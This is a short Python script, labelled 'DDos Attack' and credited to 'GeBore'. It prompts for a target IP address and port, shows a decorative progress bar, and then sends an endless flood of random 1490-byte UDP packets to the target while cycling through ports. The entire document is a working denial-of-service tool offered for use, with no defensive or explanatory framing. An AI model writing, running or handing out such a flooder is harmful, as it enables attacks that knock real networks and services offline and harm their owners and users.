import os
import socket
import random
import time
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from rich.text import Text

# Create console object
console = Console()

# Initialize socket and random bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Display header
os.system("cls")
console.print(Panel(Text("DDos Attack", justify="center", style="bold red"), title="GeBore"))

# Author info
console.print("Author   : [bold cyan]GeBore[/]")


# Input target information
ip = console.input("\n[bold green]IP Target[/] : ")
port = int(console.input("[bold green]Port[/]       : "))

# Starting attack display
os.system("clear")
console.print(Panel(Text("Attack Starting", justify="center", style="bold red"), title="GeBore"))

# Progress bar
with Progress(
    SpinnerColumn(),
    TextColumn("[progress.description]{task.description}"),
    BarColumn(),
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
) as progress:
    task = progress.add_task("[green]Preparing...", total=100)
    
    for step in [10,20,25,47,49,50,51,52,70,78,99]:
        time.sleep(0.3)
        progress.update(task, advance=step - progress.tasks[0].completed)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port = port + 1 if port < 65534 else 1
    console.print(f"Sent {sent} packet(s) to {ip} through port: {port}", end='\r')

    time.sleep(0.01)  # To reduce CPU usage
